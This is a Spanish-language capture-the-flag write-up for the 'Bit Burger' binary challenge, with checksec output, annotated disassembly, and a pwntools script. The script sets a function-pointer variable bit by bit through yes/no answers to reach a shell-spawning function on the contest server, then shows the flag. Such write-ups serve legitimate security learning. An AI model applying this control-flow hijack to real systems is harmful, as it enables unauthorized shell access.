# Bit Burger

![2025-03-25-105152_716x342_scrot](https://github.com/user-attachments/assets/bd2e464c-b5a5-4174-8500-5a83a2be5468)

Revisamos las propiedades del binario:

```
checksec --file=bit_burger.bin
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   54 Symbols	  No	0		1		bit_burger.bin
```

El binario no tiene PIE

En la funcion take_order se crea un puntero a una variable de 8 bytes que solo se actualiza cuando el usuario introduce una 'y' para asignar el valor 1 al byte correspondiente:

![2025-03-24-144629_520x21_scrot](https://github.com/user-attachments/assets/9c5d341d-89f2-4b0c-8d48-eb735f46a248)

![2025-03-24-144649_881x178_scrot](https://github.com/user-attachments/assets/bad17475-8f6e-4ff5-9016-2c5e5e0989d4)

```
|     |:|   0x00401496      488b45f0       mov rax, qword [var_10h]   # Copia el contador a rax
|     |:|   0x0040149a      ba01000000     mov edx, 1                 # Copia 1 a edx
|     |:|   0x0040149f      89c1           mov ecx, eax               # Copia el contador a ecx
|     |:|   0x004014a1      d3e2           shl edx, cl                # Deplazamiento hacia la izquierda [contador] bytes
                                                                        para crear una mascara de bits
|     |:|   0x004014a3      89d0           mov eax, edx               # Copia la mascara a eax
|     |:|   0x004014a5      4898           cdqe                       # Extiende el vlaor de 32 bits en eax a un valor de 64 bits
|     |:|   0x004014a7      480945e8       or qword [var_18h], rax    # Realiza un OR con la mascara y los bits de la variable,
                                                                        cambiando a 1 el bit correspondiente
```

Luego de la funcion take_order se llama a choose_style, que toma una entrada de 7 bytes y si falla una comparacion intenta llamar a la variable var_18h

![2025-03-25-094648_879x78_scrot](https://github.com/user-attachments/assets/da572f6e-83a4-497f-bb9e-891fdc80e00e)

![2025-03-25-094805_632x23_scrot](https://github.com/user-attachments/assets/a13cf299-e59a-48e0-9e8b-d77f587b0acb)

![2025-03-24-144829_1350x217_scrot](https://github.com/user-attachments/assets/60b89936-6c10-4b61-82ed-68afac4b0aff)

En la funcion manager_control_panel hay un pequeño codigo que invoca una shell:

![2025-03-25-095459_933x174_scrot](https://github.com/user-attachments/assets/8256bf30-c38a-4969-9e52-f875bfe18023)

Resumen:
- Las direcciones de memoria en el binario no sobrepasan los 24 bits
- Las direcciones del binario no cambian (no PIE)
- Podemos controlar hasta los primeros 24 bits de una variable
- Podemos redirigir el flujo del programa a esa variable

``` python
from pwn import *
elf = context.binary = ELF('./bit_burger.bin')
context.log_level = "error"
io = remote("binex-bitburger.ctf.ritsec.club",32200)
#io = process("./bit_burger.bin")

number = 0x401346
for i in range(24):
    if (1 << i) & number == 0:
        io.sendlineafter(b"(y/n)?", b"n")
        print("0")
    else:
        io.sendlineafter(b"(y/n)?", b"y")
        print("1")

io.sendlineafter(b"grilled or fried?: ", b"hehe")
io.interactive()
```

![2025-03-23-211015_438x344_scrot](https://github.com/user-attachments/assets/29b02791-96f6-4e86-85cb-5844ae322086)

`RS{b1ts_4nd_byt3s_4r3_0n_the_m3nu}`


